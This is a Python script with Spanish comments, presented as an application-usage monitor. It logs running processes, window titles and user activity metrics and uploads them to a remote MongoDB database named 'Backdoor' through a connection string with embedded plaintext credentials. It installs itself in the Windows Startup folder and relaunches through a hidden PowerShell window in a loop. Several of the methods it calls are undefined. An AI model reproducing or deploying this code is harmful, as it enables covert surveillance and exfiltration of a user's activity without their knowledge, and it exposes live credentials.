import os
import psutil
import time
import threading
from pymongo import MongoClient
import datetime
import json
from typing import Dict, List, Optional
from dataclasses import dataclass, asdict
import logging
from datetime import timedelta
import gzip

# Configuración de MongoDB
mongo_uri = "mongodb+srv://iraldejordan10:r5dcxq5RHNDrxt69@jarviscluster.et2fo.mongodb.net/"
client = MongoClient(mongo_uri)
db = client["Backdoor"]
collection = db["TiempoEnApps"]

# Directorio donde se guardarán los datos localmente
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
data_folder = os.path.join(desktop_path, "jarvis_data", "apps")
os.makedirs(data_folder, exist_ok=True)

# Variables de control
last_checked = time.time()
save_interval = 300  # Guardar cada 5 minutos
max_idle_time = 600  # Reiniciar después de 10 minutos de inactividad
last_saved = time.time()

# Configuración de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename=os.path.join(data_folder, 'app_monitor.log')
)

@dataclass
class AppUsageStats:
    """Clase para almacenar estadísticas de uso de aplicaciones."""
    total_time: timedelta
    session_count: int
    avg_cpu_usage: float
    avg_memory_usage: float
    last_active: datetime.datetime
    focus_time: timedelta  # Tiempo que la app estuvo en primer plano

class AppMonitor:
    """Clase principal para monitorear aplicaciones."""
    def __init__(self):
        self.app_stats: Dict[str, AppUsageStats] = {}
        self.last_active_window = None
        self.session_start = datetime.datetime.now()
        self.active_apps_history = []

    def get_app_details(self, proc):
        """Obtiene detalles extendidos de la aplicación."""
        try:
            with proc.oneshot():  # Optimiza múltiples llamadas
                return {
                    'pid': proc.pid,
                    'name': proc.name(),
                    'start_time': datetime.datetime.fromtimestamp(proc.create_time()),
                    'cpu_usage': proc.cpu_percent(),
                    'memory_usage': proc.memory_percent(),
                    'status': proc.status(),
                    'category': self.categorize_app(proc.name()),
                    'window_title': self.get_window_title(proc.pid),
                    'command_line': proc.cmdline(),
                    'num_threads': proc.num_threads(),
                    'parent_process': proc.parent().name() if proc.parent() else None,
                    'children_processes': [child.name() for child in proc.children()],
                    'is_focused': self.is_focused_window(proc.pid)
                }
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            return None

    def analyze_usage_patterns(self) -> Dict:
        """Analiza patrones de uso para insights."""
        return {
            'most_used_apps': self.get_most_used_apps(),
            'peak_usage_times': self.get_peak_usage_times(),
            'productivity_score': self.calculate_productivity_score(),
            'usage_trends': self.calculate_usage_trends(),
            'category_distribution': self.get_category_distribution()
        }

    def calculate_productivity_score(self) -> float:
        """Calcula un score de productividad basado en el uso de apps."""
        productivity_weights = {
            'development': 1.0,
            'productivity': 0.8,
            'communication': 0.6,
            'browsers': 0.4,
            'entertainment': 0.2
        }
        # ... cálculo del score ...
        return score

    def save_to_db(self, active_apps: List[Dict]):
        """Guarda datos con análisis adicional."""
        timestamp = datetime.datetime.utcnow()
        
        # Análisis de la sesión actual
        session_analysis = {
            'duration': (datetime.datetime.now() - self.session_start).total_seconds(),
            'productivity_score': self.calculate_productivity_score(),
            'usage_patterns': self.analyze_usage_patterns(),
            'system_resources': self.get_system_resources(),
            'user_activity_metrics': self.get_user_activity_metrics()
        }

        document = {
            'timestamp': timestamp,
            'apps': active_apps,
            'session_analysis': session_analysis,
            'system_info': self.get_system_info(),
            'usage_metrics': {
                'total_apps': len(active_apps),
                'categories': self.get_category_distribution(active_apps),
                'focus_time': self.calculate_focus_time()
            }
        }

        # Guardar en MongoDB
        collection.insert_one(document)

        # Guardar en archivo local con compresión
        file_path = os.path.join(data_folder, f"app_usage_{timestamp.isoformat()}.gz")
        with gzip.open(file_path, 'wt', encoding='utf-8') as f:
            json.dump(document, f, default=str, indent=2)

    def get_user_activity_metrics(self) -> Dict:
        """Obtiene métricas de actividad del usuario."""
        return {
            'keyboard_activity': self.get_keyboard_activity(),
            'mouse_activity': self.get_mouse_activity(),
            'active_window_changes': self.get_window_changes(),
            'idle_time': self.get_idle_time()
        }

def get_active_apps():
    """Obtiene los procesos activos coninformación más detallada."""
    active_apps = []
    for proc in psutil.process_iter(['pid', 'name', 'create_time', 'cpu_percent', 'memory_percent', 'status']):
        try:
            if proc.info['name'] and proc.info['create_time']:
                start_time = datetime.datetime.fromtimestamp(proc.info['create_time'])
                # Agregamos más información útil para el análisis
                active_apps.append({
                    'pid': proc.info['pid'],
                    'name': proc.info['name'],
                    'start_time': start_time,
                    'cpu_usage': proc.info['cpu_percent'],
                    'memory_usage': proc.info['memory_percent'],
                    'status': proc.info['status'],
                    'category': categorize_app(proc.info['name']),  # Nueva función
                    'window_title': get_window_title(proc.info['pid'])  # Nueva función
                })
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return active_apps

def categorize_app(app_name):
    """Categoriza las aplicaciones en grupos."""
    categories = {
        'browsers': ['chrome.exe', 'firefox.exe', 'msedge.exe'],
        'productivity': ['word.exe', 'excel.exe', 'powerpoint.exe', 'code.exe'],
        'communication': ['teams.exe', 'slack.exe', 'discord.exe'],
        'entertainment': ['spotify.exe', 'netflix.exe', 'steam.exe'],
        'development': ['python.exe', 'node.exe', 'git.exe']
    }
    
    app_name = app_name.lower()
    for category, apps in categories.items():
        if any(app in app_name for app in apps):
            return category
    return 'other'

def get_window_title(pid):
    """Obtiene el título de la ventana activa del proceso."""
    try:
        import win32gui
        import win32process
        def callback(hwnd, titles):
            if win32gui.IsWindowVisible(hwnd):
                _, found_pid = win32process.GetWindowThreadProcessId(hwnd)
                if found_pid == pid:
                    titles.append(win32gui.GetWindowText(hwnd))
            return True
        titles = []
        win32gui.EnumWindows(callback, titles)
        return titles[0] if titles else ''
    except:
        return ''

def save_to_db(active_apps):
    """Guarda la información con metadatos adicionales."""
    timestamp = datetime.datetime.utcnow()
    system_info = {
        'cpu_total': psutil.cpu_percent(interval=1),
        'memory_total': psutil.virtual_memory().percent,
        'boot_time': datetime.datetime.fromtimestamp(psutil.boot_time()),
        'platform': os.name,
        'machine': os.environ.get('COMPUTERNAME', 'unknown')
    }
    
    document = {
        "timestamp": timestamp,
        "system_info": system_info,
        "apps": active_apps,
        "session_metrics": {
            "total_apps": len(active_apps),
            "categories_distribution": get_category_distribution(active_apps)
        }
    }
    
    collection.insert_one(document)
    
    # Guardar en formato JSON para mejor procesamiento
    file_name = os.path.join(data_folder, f"app_usage_{timestamp.isoformat()}.json")
    with open(file_name, 'w', encoding='utf-8') as file:
        json.dump(document, file, default=str, indent=2)

def get_category_distribution(active_apps):
    """Calcula la distribución de aplicaciones por categoría."""
    distribution = {}
    for app in active_apps:
        category = app['category']
        distribution[category] = distribution.get(category, 0) + 1
    return distribution

def monitor_app_usage():
    """Monitorea el uso de aplicaciones y guarda los datos cada cierto intervalo."""
    global last_checked, last_saved
    while True:
        time.sleep(10)  # Revisa el uso de las aplicaciones cada 10 segundos
        active_apps = get_active_apps()
        last_checked = time.time()

        # Guarda los datos cada 5 minutos
        if (time.time() - last_saved) >= save_interval:
            save_to_db(active_apps)
            last_saved = time.time()

        # Reinicia el proceso si ha pasado más de 10 minutos sin actividad
        if (time.time() - last_checked) >= max_idle_time:
            print("Inactividad detectada, reiniciando...")
            last_checked = time.time()  # Resetear el contador de inactividad

def create_startup_file():
    """Crea un archivo .bat para asegurarse de que el script se ejecute al iniciar el sistema."""
    bat_content = f'''@echo off
                        where python >nul 2>nul
                        if %ERRORLEVEL% neq 0 (
                            echo Python no está instalado. Instale Python.
                            exit /b
                        )

                        python -m pip install --upgrade pip
                        pip install psutil pymongo

                        set "PYTHON_SCRIPT={os.path.abspath(__file__)}"
                        powershell -windowstyle hidden -command "try {{ python '{os.path.abspath(__file__)}' }} catch {{ exit 1 }}"

                        :inicio
                        python %PYTHON_SCRIPT%
                        goto inicio
'''
    bat_file_path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup', 'run_app_monitor.bat')
    with open(bat_file_path, 'w') as bat_file:
        bat_file.write(bat_content)
    print(f'Archivo de inicio creado en: {bat_file_path}')

def main():
    """Configuración principal del monitor de aplicaciones."""
    if not os.path.isfile(os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup', 'run_app_monitor.bat')):
        create_startup_file()

    # Iniciar el hilo de monitoreo
    monitor_thread = threading.Thread(target=monitor_app_usage)
    monitor_thread.daemon = True
    monitor_thread.start()

    # Mantener el script corriendo
    while True:
        time.sleep(10)

if __name__ == "__main__":
    main()
